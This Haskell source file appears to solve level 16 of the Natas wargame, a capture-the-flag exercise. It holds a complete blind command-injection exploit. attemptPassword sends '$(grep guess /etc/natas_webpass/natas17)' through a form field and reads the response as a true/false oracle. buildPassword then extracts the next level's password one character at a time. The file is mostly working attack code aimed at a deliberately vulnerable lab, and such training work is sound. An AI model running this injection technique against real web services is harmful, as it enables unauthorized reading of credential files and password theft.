{-# LANGUAGE OverloadedStrings #-}

module Natas.Natas16 where

import           Control.Monad       (filterM)

import           Data.Text           (breakOn, pack)

import           Control.Monad.Loops (firstM)
import           Network.Wreq        (partText)

import           Natas.Natas

solution :: Solution
solution = do
  presentChars <- filterM (attemptPassword . pure) validChars
  print presentChars
  match <- buildPassword presentChars ""
  pure $ fmap pack match

buildPassword :: String -> String -> IO (Maybe String)
buildPassword avail curr = do
  let placeEnd x = curr ++ pure x
      headMatch = attemptPassword . ("^" ++)
  matches <- (firstM headMatch . fmap placeEnd) avail
  case matches of
    Nothing -> pure (pure curr)
    Just match -> do
      print match
      buildPassword avail match

attemptPassword :: String -> IO Bool
attemptPassword guess = do
  let uniqword = "unique"
      shellInject =
        (pack . concat)
          ["$(grep " , guess, " /etc/natas_webpass/natas17)", uniqword]
      form = partText "needle" shellInject
  req <- postLevel 16 form
  let body = reqBody req
  pure $
    case breakOn (pack uniqword) body of
      (_match, "") -> True
      _tupmatch    -> False

validChars :: String
validChars = ['0' .. '9'] ++ ['A' .. 'Z'] ++ ['a' .. 'z']
